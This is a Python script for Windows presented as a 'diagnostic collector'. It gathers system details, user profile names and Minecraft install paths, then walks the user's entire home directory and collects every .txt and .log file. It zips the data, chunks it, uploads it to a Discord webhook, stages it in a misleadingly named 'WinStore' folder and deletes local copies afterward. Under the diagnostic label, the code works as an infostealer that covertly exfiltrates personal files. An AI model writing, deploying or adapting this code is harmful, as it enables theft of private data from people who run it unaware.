#!/usr/bin/env python3
"""
!!!!-ONLY WORKS WITH WINDOWS MACHINES-!!!!

Optimized Diagnostic Collector — stdlib only (no pip dependencies)
Collects system information to help diagnose issues and uploads
the data to a Discord webhook in chunks.
Then rebuild the information back into a whole using another script.
"""

from __future__ import annotations

import ctypes
import io
import json
import mimetypes
import os
import platform
import shutil
import socket
import time
import urllib.error
import urllib.request
import uuid
import zipfile
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

# ─── CONFIG ──────────────────────────────────────────────────────────────────

WEBHOOK_URL        = ""     # discord webhook url
CLEANUP_AFTER_SEND = True   # delete local files after a successful upload
VERBOSE            = True   # print progress to terminal

BASE_OUTPUT = Path(os.getenv("PROGRAMDATA") or Path.home()) / "WinStore"

ZIP_NAME_TEMPLATE      = "diagnostics_{ts}.zip"
JSON_NAME_TEMPLATE     = "system_info_{ts}.json"
MANIFEST_NAME_TEMPLATE = "manifest.json"  # timestamped → no collision on concurrent runs

DISCORD_SAFE_CHUNK = 7 * 1024 * 1024  # 7 MB  (Discord hard limit is 8 MB)
UPLOAD_DELAY       = 3                 # seconds between chunk uploads
MAX_UPLOAD_RETRIES = 3                 # retry attempts per file on failure

# ─── UTILS ───────────────────────────────────────────────────────────────────

def log(msg: str) -> None:
    if VERBOSE:
        print(msg)


def now_ts() -> str:
    return datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")


def safe_scale(num: float) -> str:
    try:
        n = float(num)
    except Exception:
        return str(num)
    for unit in ("B", "KB", "MB", "GB", "TB"):
        if n < 1024:
            return f"{n:.2f} {unit}"
        n /= 1024
    return f"{n:.2f} PB"

# ─── WINDOWS SYSTEM INFO (ctypes / stdlib) ───────────────────────────────────

class _MEMORYSTATUSEX(ctypes.Structure):
    """Win32 MEMORYSTATUSEX structure."""
    _fields_ = [
        ("dwLength",                ctypes.c_ulong),
        ("dwMemoryLoad",            ctypes.c_ulong),
        ("ullTotalPhys",            ctypes.c_ulonglong),
        ("ullAvailPhys",            ctypes.c_ulonglong),
        ("ullTotalPageFile",        ctypes.c_ulonglong),
        ("ullAvailPageFile",        ctypes.c_ulonglong),
        ("ullTotalVirtual",         ctypes.c_ulonglong),
        ("ullAvailVirtual",         ctypes.c_ulonglong),
        ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
    ]


def _get_memory() -> Dict[str, Any]:
    stat = _MEMORYSTATUSEX()
    stat.dwLength = ctypes.sizeof(_MEMORYSTATUSEX)
    try:
        ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(stat))  # type: ignore[attr-defined]
        used = stat.ullTotalPhys - stat.ullAvailPhys
        return {
            "total":     safe_scale(stat.ullTotalPhys),
            "available": safe_scale(stat.ullAvailPhys),
            "used":      safe_scale(used),
            "percent":   stat.dwMemoryLoad,
        }
    except Exception as exc:
        return {"error": repr(exc)}


def _get_disks() -> List[Dict[str, Any]]:
    disks: List[Dict[str, Any]] = []
    # Enumerate mounted drives via Windows drive bitmask
    try:
        bitmask = ctypes.windll.kernel32.GetLogicalDrives()  # type: ignore[attr-defined]
    except Exception:
        bitmask = 0

    for i in range(26):
        if not (bitmask >> i & 1):
            continue
        letter = f"{chr(65 + i)}:\\"
        try:
            usage = shutil.disk_usage(letter)
            disks.append({
                "device":  letter,
                "total":   safe_scale(usage.total),
                "used":    safe_scale(usage.used),
                "free":    safe_scale(usage.free),
                "percent": round(usage.used / usage.total * 100, 1) if usage.total else 0,
            })
        except Exception:
            continue
    return disks


def _get_local_ips() -> List[str]:
    ips: List[str] = []
    try:
        hostname = socket.gethostname()
        for info in socket.getaddrinfo(hostname, None, socket.AF_INET):
            addr = info[4][0]
            if not addr.startswith("127.") and addr not in ips:
                ips.append(addr)
    except Exception:
        pass
    return sorted(ips)

# ─── COLLECTORS ──────────────────────────────────────────────────────────────

def collect_system_info() -> Dict[str, Any]:
    info: Dict[str, Any] = {"timestamp": datetime.now(timezone.utc).isoformat()}
    try:
        uname = platform.uname()
        info["platform"] = {
            "system":    uname.system,
            "node":      uname.node,
            "release":   uname.release,
            "version":   uname.version,
            "machine":   uname.machine,
            "processor": uname.processor,
        }
        info["cpu"] = {
            "logical_cores": os.cpu_count(),  # os.cpu_count() returns logical cores only
        }
        info["memory"]    = _get_memory()
        info["disks"]     = _get_disks()
        info["local_ips"] = _get_local_ips()
    except Exception as exc:
        info["error"] = repr(exc)
        log(f"[ERROR] collect_system_info: {exc}")
    return info


def list_installed_programs_windows() -> List[str]:
    return []  # stub — registry enumeration omitted for speed


def list_user_profiles() -> List[Dict[str, str]]:
    users: List[Dict[str, str]] = []
    base = Path(os.environ.get("SYSTEMDRIVE", "C:")) / "Users"
    if not base.exists():
        return users
    try:
        for entry in base.iterdir():
            if entry.is_dir() and entry.name.lower() not in {
                "public", "default", "default user", "all users"
            }:
                users.append({"username": entry.name, "path": str(entry)})
    except Exception as exc:
        log(f"[WARN] list_user_profiles: {exc}")
    return users


def detect_minecraft_folder() -> Dict[str, Any]:
    result: Dict[str, Any] = {
        "java_installed":    False,
        "java_path":         None,
        "bedrock_installed": False,
        "bedrock_path":      None,
    }
    home = Path.home()

    java_path = home / "AppData" / "Roaming" / ".minecraft"
    if java_path.exists():
        result["java_installed"] = True
        result["java_path"]      = str(java_path)

    packages_dir = home / "AppData" / "Local" / "Packages"
    if packages_dir.exists():
        try:
            for pkg in packages_dir.iterdir():
                if "minecraft" in pkg.name.lower() and "bedrock" in pkg.name.lower():
                    result["bedrock_installed"] = True
                    result["bedrock_path"]      = str(pkg)
                    break
        except Exception as exc:
            log(f"[WARN] detect_minecraft_folder (bedrock): {exc}")

    return result

# ─── FILE COLLECTION ─────────────────────────────────────────────────────────

def find_target_files() -> List[Path]:
    home                 = Path.home()
    exts                 = {".txt", ".log"}
    results: List[Path]  = []
    output_resolved      = BASE_OUTPUT.resolve()

    for root, dirs, files in os.walk(home):
        root_resolved = Path(root).resolve()

        # Skip our own output directory so we never re-include previous runs
        try:
            root_resolved.relative_to(output_resolved)
            dirs.clear()
            continue
        except ValueError:
            pass

        for fname in files:
            fp = Path(root) / fname
            if fp.suffix.lower() not in exts:
                continue
            try:
                if fp.stat().st_size > 10 * 1024 * 1024:  # skip files over 10 MB
                    log(f"[SKIP] {fp.name} exceeds 10 MB limit")
                    continue
            except Exception:
                continue
            results.append(fp)

    return results

# ─── ZIP / CHUNK ─────────────────────────────────────────────────────────────

def create_compressed_zip(files: List[Path], zip_path: Path) -> Path:
    home = Path.home()
    with zipfile.ZipFile(zip_path, "w", compression=zipfile.ZIP_DEFLATED, compresslevel=6) as zf:
        for fp in files:
            try:
                try:
                    arcname: Any = fp.relative_to(home)
                except ValueError:
                    arcname = fp.name  # outside home dir (e.g. json under PROGRAMDATA)
                zf.write(fp, arcname=arcname)
            except Exception as exc:
                log(f"[WARN] Skipping {fp.name}: {exc}")
    return zip_path


def split_file(file_path: Path, chunk_size: int = DISCORD_SAFE_CHUNK) -> List[Path]:
    chunks: List[Path] = []
    with open(file_path, "rb") as fh:
        idx = 1
        while True:
            data = fh.read(chunk_size)
            if not data:
                break
            part = file_path.with_name(
                f"{file_path.stem}_part{idx:03d}{file_path.suffix}.chunk"
            )
            part.write_bytes(data)
            chunks.append(part)
            idx += 1
    return chunks


def create_manifest(chunks: List[Path], zip_name: str, path: Path) -> None:
    payload = {
        "final_zip_name": zip_name,
        "total_chunks":   len(chunks),
        "chunks":         [c.name for c in chunks],
        "created":        datetime.now(timezone.utc).isoformat(),
    }
    path.write_text(json.dumps(payload, indent=2), encoding="utf-8")

# ─── UPLOAD (urllib — no external deps) ──────────────────────────────────────

def _build_multipart(fields: Dict[str, str], file_field: str, filename: str, file_data: bytes) -> Tuple[bytes, str]:
    """Build a multipart/form-data body without any third-party libraries."""
    boundary = uuid.uuid4().hex
    ctype    = mimetypes.guess_type(filename)[0] or "application/octet-stream"
    buf      = io.BytesIO()

    for name, value in fields.items():
        buf.write(f"--{boundary}\r\n".encode())
        buf.write(f'Content-Disposition: form-data; name="{name}"\r\n\r\n'.encode())
        buf.write(value.encode() + b"\r\n")

    buf.write(f"--{boundary}\r\n".encode())
    buf.write(f'Content-Disposition: form-data; name="{file_field}"; filename="{filename}"\r\n'.encode())
    buf.write(f"Content-Type: {ctype}\r\n\r\n".encode())
    buf.write(file_data + b"\r\n")
    buf.write(f"--{boundary}--\r\n".encode())

    return buf.getvalue(), f"multipart/form-data; boundary={boundary}"


def _upload_one(path: Path, label: str) -> bool:
    """Upload one file to the Discord webhook with exponential-backoff retries."""
    if not WEBHOOK_URL:
        log("[ERROR] WEBHOOK_URL is not set.")
        return False

    file_data = path.read_bytes()

    for attempt in range(1, MAX_UPLOAD_RETRIES + 1):
        try:
            body, content_type = _build_multipart(
                fields={"content": label},
                file_field="file",
                filename=path.name,
                file_data=file_data,
            )
            req = urllib.request.Request(
                WEBHOOK_URL,
                data=body,
                headers={
                    "Content-Type": content_type,
                    "User-Agent": "DiscordBot (diagnostic-tool, 1.0)",
                },
                method="POST",
            )
            with urllib.request.urlopen(req, timeout=60) as resp:
                if resp.status in (200, 204):
                    return True
                log(f"[WARN] Attempt {attempt}/{MAX_UPLOAD_RETRIES} for {path.name}: HTTP {resp.status}")

        except urllib.error.HTTPError as exc:
            log(f"[WARN] Attempt {attempt}/{MAX_UPLOAD_RETRIES} for {path.name}: HTTP {exc.code} {exc.reason}")
        except Exception as exc:
            log(f"[WARN] Attempt {attempt}/{MAX_UPLOAD_RETRIES} for {path.name}: {exc}")

        if attempt < MAX_UPLOAD_RETRIES:
            time.sleep(attempt * 2)  # back-off: 2 s, 4 s

    log(f"[ERROR] All retries exhausted for {path.name}")
    return False


def upload_chunks_to_discord(chunks: List[Path], manifest: Optional[Path] = None) -> bool:
    success = True
    total   = len(chunks)

    for idx, chunk in enumerate(chunks, 1):
        ok = _upload_one(chunk, f"Diagnostic chunk {idx}/{total}")
        if ok:
            log(f"[OK] Uploaded {chunk.name} ({idx}/{total})")
        else:
            success = False
        if idx < total:
            time.sleep(UPLOAD_DELAY)

    if manifest and manifest.exists():
        ok = _upload_one(manifest, "Manifest — diagnostic upload")
        if ok:
            log("[OK] Uploaded manifest.")
        else:
            success = False

    return success

# ─── CLEANUP ─────────────────────────────────────────────────────────────────

def safe_remove(path: Path) -> None:
    try:
        if path.is_file():
            path.unlink()
        elif path.is_dir():
            shutil.rmtree(path)
    except Exception:
        pass

# ─── MAIN ────────────────────────────────────────────────────────────────────

def _safe_get(future: Any, name: str) -> Any:
    try:
        return future.result()
    except Exception as exc:
        log(f"[ERROR] {name} failed: {exc}")
        return None


def run_collection_and_upload() -> None:
    ts = now_ts()
    BASE_OUTPUT.mkdir(parents=True, exist_ok=True)
    log(f"[INFO] Output: {BASE_OUTPUT}")

    log("[INFO] Collecting diagnostics in parallel...")
    with ThreadPoolExecutor(max_workers=5) as pool:
        fut_sysinfo   = pool.submit(collect_system_info)
        fut_programs  = pool.submit(list_installed_programs_windows)
        fut_profiles  = pool.submit(list_user_profiles)
        fut_minecraft = pool.submit(detect_minecraft_folder)
        fut_files     = pool.submit(find_target_files)

        system_info        = _safe_get(fut_sysinfo,   "collect_system_info")
        installed_programs = _safe_get(fut_programs,  "list_installed_programs_windows")
        user_profiles      = _safe_get(fut_profiles,  "list_user_profiles")
        minecraft          = _safe_get(fut_minecraft, "detect_minecraft_folder")
        target_files: List[Path] = _safe_get(fut_files, "find_target_files") or []

    log(f"[INFO] Found {len(target_files)} log/text file(s).")

    payload = {
        "system_info":        system_info,
        "installed_programs": installed_programs,
        "user_profiles":      user_profiles,
        "minecraft":          minecraft,
    }

    json_path = BASE_OUTPUT / JSON_NAME_TEMPLATE.format(ts=ts)
    json_path.write_text(json.dumps(payload, indent=2), encoding="utf-8")
    log(f"[INFO] System info → {json_path.name}")

    zip_path = BASE_OUTPUT / ZIP_NAME_TEMPLATE.format(ts=ts)
    log("[INFO] Creating zip archive...")
    create_compressed_zip([json_path] + target_files, zip_path)

    if not zip_path.exists() or zip_path.stat().st_size == 0:
        log("[ERROR] Zip creation failed — aborting upload.")
        return

    log(f"[INFO] Zip ready: {zip_path.name} ({safe_scale(zip_path.stat().st_size)})")

    chunks = split_file(zip_path)
    log(f"[INFO] Split into {len(chunks)} chunk(s).")

    manifest_path = BASE_OUTPUT / MANIFEST_NAME_TEMPLATE.format(ts=ts)
    create_manifest(chunks, zip_path.name, manifest_path)

    log("[INFO] Uploading to Discord...")
    uploaded = upload_chunks_to_discord(chunks, manifest_path)

    if uploaded:
        log("[INFO] Upload complete.")
        if CLEANUP_AFTER_SEND:
            for chunk in chunks:
                safe_remove(chunk)
            safe_remove(zip_path)
            safe_remove(json_path)
            safe_remove(manifest_path)
            log("[INFO] Local files cleaned up.")
    else:
        log("[WARN] One or more uploads failed — local files kept for manual retry.")


if __name__ == "__main__":
    run_collection_and_upload()
